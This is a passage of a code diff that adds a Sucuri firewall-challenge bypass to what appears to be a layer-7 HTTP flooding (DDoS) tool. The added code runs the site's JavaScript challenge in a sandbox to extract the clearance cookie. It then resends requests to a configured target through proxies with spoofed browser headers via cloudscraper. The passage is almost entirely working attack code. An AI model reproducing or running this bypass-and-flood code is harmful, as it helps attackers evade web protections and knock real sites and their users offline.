+            reload: () => {}
+        };
+
+        var environment = {
+            location,
+            document
+        }
+
+        return environment;
+    }
+
+    function parseCookie(cookie) {
+        return new Promise((resolve, reject) => {
+            var match = cookie.match(COOKIE_REGEXP);
+            if (match === null) {
+                reject('[sucuri]: cannot parse cookie')
+            } else {
+                //match[1]; // Cookie name
+                //match[2]; // Cookie value
+                resolve(match[1] + '=' + match[2]);
+            }
+        });
+    }
+
+    function solve(challenge) {
+        return new Promise((resolve, reject) => {
+            var environment = createEnvironment(cookie => {
+                resolve(parseCookie(cookie));
+            });
+
+            try {
+                vm.runInNewContext(challenge, environment, {
+                    timeout: 1e3
+                });
+                reject('[sucuri]: Timed out while getting cookie.');
+            } catch (e) {
+                reject(e.message);
+            }
+        });
+    }
+
+    function Bypasser(body) {
+        return new Promise((resolve, reject) => {
+            var match = body.match(CHALLENGE_REGEXP);
+            if (match === null) {
+                reject('[sucuri]: cannot find Sucuri challenge')
+            } else {
+                var challenge = match[1];
+                resolve(solve(challenge));
+            }
+        });
+    }
+
+    return function bypass(proxy, uagent, callback) {
+        request.get({
+            url: l7.target,
+            gzip: true,
+            proxy: proxy,
+            followAllRedirects: true,
+            headers: {
+                'Connection': 'keep-alive',
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': 1,
+                'User-Agent': uagent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9'
+            }
+        }, (err, res, body) => {
+            if (err || !res || !body) {
+                return false;
+            }
+            Bypasser(body).then(cookie => {
+                cloudscraper({
+                    method: l7.opt.method,
+                    url: l7.target,
+                    gzip: true,
+                    proxy: proxy,
+                    followAllRedirects: true,
+                    headers: {
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'max-age=0',
+                        'Upgrade-Insecure-Requests': 1,
+                        'User-Agent': uagent,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        "Cookie": cookie
+                    }
+                }, (err, res, body) => {
+                    if (err) {
+                        return false;
+                    }
+                    console.log(cookie);
+                    callback(cookie);
+                })
+            });
+        });
+    }
+}
+
 };
 process.on("uncaughtException", errorHandler);
 process.on("unhandledRejection", errorHandler);
@@ -3546,7 +4228,6 @@ const rateHeaders2 = [
  }
 var hd={}
  const Socker = new NetSocket();
-headers[":method"] = "GET";
 headers[":method"] = "GET";
 headers[":method"] = "POST";
 headers[":method"] = "POST";
